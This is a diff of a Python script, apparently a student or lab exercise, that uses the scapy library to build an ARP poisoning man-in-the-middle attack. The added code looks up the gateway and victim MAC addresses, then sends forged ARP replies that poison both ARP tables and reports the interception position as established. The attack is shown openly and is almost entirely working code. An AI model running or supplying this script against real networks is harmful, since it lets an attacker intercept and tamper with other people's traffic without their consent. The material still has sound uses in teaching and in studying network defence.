@@ -1,11 +1,5 @@
 from scapy.all import *
 
-# find local gateway addresses and interface, using a random IP address for the command
-route = conf.route.route("123.123.123.000") 
-
-INTERFACE = route[0]
-GATEWAY_IP = route[2]
-
 # Attacker's addresses
 ATTACKER_IP = "192.168.209.128"
 
@@ -13,7 +7,40 @@ ATTACKER_IP = "192.168.209.128"
 VICTIM_IP = "192.168.1.123"
 # TODO: set up simulated victim
 
+def find_gateway():
+    return conf.route.route("123.123.123.000")[2]
+
+def find_mac(target_IP):
+    broadcast = "ff:ff:ff:ff:ff:ff"
+
+    # send ARP request to victim for MAC address
+    arp_request = Ether(dst=broadcast)/ARP(pdst=target_IP)
+    answered, unanswered = srp(arp_request, timeout=2, verbose=False)
+
+    for sent, received in answered:
+        if received.psrc == target_IP:
+            return received.hwsrc
+
 if __name__ == "__main__":
-    arp_mitm(GATEWAY_IP, VICTIM_IP)
+    gateway_ip = find_gateway()
+    gateway_mac = find_mac(gateway_ip)
+    print(f"[ARP Poison] The gateway of this network is at IP address {gateway_ip} and MAC address {gateway_mac}.")
+
+    victim_mac = find_mac(VICTIM_IP)
+    print(f"[ARP Poison] The victim at IP address {VICTIM_IP} is at MAC address {victim_mac}.")
+
+    # forge ARP packet to victim pretending to be the gateway
+    # hwsrc is automatically set to the MAC of the attacker.
+    victim_packet = ARP(op="is-at", psrc=gateway_ip, pdst=VICTIM_IP, hwdst=victim_mac)
+    send(victim_packet, verbose=False)
+    print(f"[ARP Poison] ARP table of the victim has been poisoned.")
+    
+    # forge ARP packet to gateway pretending to be the victim. 
+    # hwsrc is automatically set to the MAC of the attacker.
+    gateway_packet = ARP(op="is-at", psrc=VICTIM_IP, pdst=gateway_ip, hwdst=gateway_mac)
+    send(gateway_packet, verbose=False)
+    print(f"[ARP Poison] ARP table of the gateway has been poisoned.")
+
+    print("Man in the Middle position has been established.")
 
     # sudo python3 arp_module.py
